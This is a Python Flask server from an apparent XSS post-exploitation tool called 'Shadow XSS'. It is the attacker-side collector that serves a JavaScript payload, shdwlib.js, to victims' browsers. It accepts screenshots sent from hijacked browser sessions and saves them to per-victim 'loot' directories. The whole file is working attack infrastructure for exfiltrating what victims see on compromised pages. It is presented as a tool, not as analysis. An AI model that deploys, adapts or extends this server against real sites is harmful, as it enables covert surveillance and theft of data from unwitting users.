#!usr/bin/env python
from flask import Flask, jsonify, abort, make_response, g, request, render_template
from flask_cors import CORS
from enum import Enum
import json
import os


app = Flask(__name__)
CORS(app)


def printHeader():
    print("""
                          .▄▄ ·  ▄ .▄ ▄▄▄· ·▄▄▄▄       ▄▄▌ ▐ ▄▌
                          ▐█ ▀. ██▪▐█▐█ ▀█ ██▪ ██▪     ██· █▌▐█
                          ▄▀▀▀█▄██▀▐█▄█▀▀█ ▐█· ▐█▌▄█▀▄ ██▪▐█▐▐▌
                          ▐█▄▪▐███▌▐▀▐█ ▪▐▌██. ██▐█▌.▐▌▐█▌██▐█▌
                           ▀▀▀▀ ▀▀▀ · ▀  ▀ ▀▀▀▀▀• ▀█▄▀▪ ▀▀▀▀ ▀▪                                                                                                                    
                                                             ,/,@ ...          
              ....,,*,.                                 .&@( .@&%.   @         
               ,@@/ ,#@@@@@&*    .*(%@@@@%/.        %@@@@#         &*          
                   .&@@#.    /&@@@@@%,          ./%@@@@@@@@@@.   &(            
                        .@@@@@/      ,&@@@@@(          *@@@@@@@@&              
                              %@@@@@@@@/    .&@@@@@*       %@@@.               
                            ,@@@@@@@@@(&@.,(%%%#.  /&@@@@#.   &@(              
                           &@@@@@@ *@@@@@@@% ,@,   (      /@@@@( /@@.          
                          @@@@@@@@@@@@@@@@ /#           *#      *&@@@@@/       
                       .@@@,   .@@@@@@@@@/        ,(/   @@@@@&/      .@@@@%    
                    /@@@,     ,@@@@@&,    /,  (.#&%/.*(@@@@@*@@@@@@@@%,   &@@, 
                 %@@@,                         ..*#@@@@@/     (@@#   ./&@@@@@@@
              &@@@.                     *&@@@@@@@#@@@           @@@           
          .@@@&               ./%@@@@@@&/.        @@@            #@@,          
       ,@@@%        *#&@@@@@@@(.                  @@@             *@@(         
    *@@@/,(&@@@@@@@&(.                            @@@              .@@%       
 ,@@@@@@@%*.                                      @@#               *@@%       
                                                 &@@.                &@@.      
                                                #@@/                  @@@      
                                               @@@,                   *@@(     
                                             &@@%                      &@@,    
                                          ,@@@(                         @@@                                                               
                                     ▐▄• ▄ .▄▄ · .▄▄ · 
                                      █▌█▌▪▐█ ▀. ▐█ ▀. 
                                      ·██· ▄▀▀▀█▄▄▀▀▀█▄
                                     ▪▐█·█▌▐█▄▪▐█▐█▄▪▐█
                                     •▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀ 

                                       by @hoodoer
        """)


#***************************************************************************
# Support Types
SessionDirectories = {}
lootDirCounter = 1



#***************************************************************************
# Support Functions



# Need function to check session, return download directory
def findLootDirectory(identifier):
    # Check if we know of this session and what it's 
    # loot directory is. 
    # If it's a new session we haven't seen before, create a new loot directory 
    # and return it to the caller. 

    global lootDirCounter

    if identifier in SessionDirectories.keys():
        print("We know this session!")
    else:
        print("New session!")
        SessionDirectories[identifier] = lootDirCounter
        lootDirCounter = lootDirCounter + 1
        lootPath = './loot/' + str(SessionDirectories[identifier])
        print("Checking if loot dir exists: " + lootPath)
        if not os.path.exists(lootPath):
            print("Creating directory...")
            os.mkdir(lootPath)
            sessionFile = open(lootPath + "/session.txt", "w")
            sessionFile.write("Session identifier:\n")
            sessionFile.write(identifier + "\n")
            sessionFile.close()
        else:
            print("Loot directory already exists")

    lootDir = SessionDirectories[identifier]
    print("Loot directory is: " + str(lootDir))
    return str(lootDir)





#def saveScreenshot(identifier):





#***************************************************************************
# API Endpoints

# Send a copy of the payload
@app.route('/lib/shdwlib.js', methods=['GET'])
def sendPayload():
    with open('./shdwlib.js', 'rb') as file:
        return file.read(), 200



# Capture screenshot
@app.route('/loot/screenshot/<identifier>', methods=['POST'])
def recordScreenshot(identifier):
    print("Received image from: " + identifier)
    print("Looking up loot dir...")
    lootDir = findLootDirectory(identifier)
    image = request.data
    print("Writing the file to disk...")
    with open ("./loot/" + lootDir + "/tmpScreenshot.png", "wb") as binary_file:
        binary_file.write(image)
        binary_file.close()

    return "ok", 200



if __name__ == '__main__':
    printHeader()
    app.run(debug=False, host='0.0.0.0', port=8444)
